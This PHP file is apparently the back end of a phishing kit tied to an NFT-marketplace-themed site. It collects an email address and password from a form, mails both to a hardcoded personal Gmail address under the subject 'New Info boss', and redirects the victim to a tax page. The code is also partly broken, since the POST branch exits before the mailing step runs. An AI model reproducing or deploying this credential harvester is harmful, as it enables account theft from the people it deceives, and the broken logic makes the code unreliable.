<?php 

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Handle form data
    
    // Redirect to another HTML page
    header("Location: /tax.html");
    exit; // Make sure to exit after redirection
}

if(isset($_POST)){
   $to = "toluegbon@gmail.com"; 
    $from = "nftmarkethub.site";
    $email = $_POST['email'];
    $password = $_POST['password'];
    $subject = "New Info boss";
    $subject2 = "Copy of your form submission";
    $message =    " (Email):" . "\n\n" . $_POST['email'].   " (password):" . "\n\n" . $_POST['password'];
    $message2 = "Here is a copy of your message " . $first_name . "\n\n" . $_POST['message'];
    $headers = "From:" . $from;
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers);
    mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender
   
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    }
    header('Location: ');


// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
?>
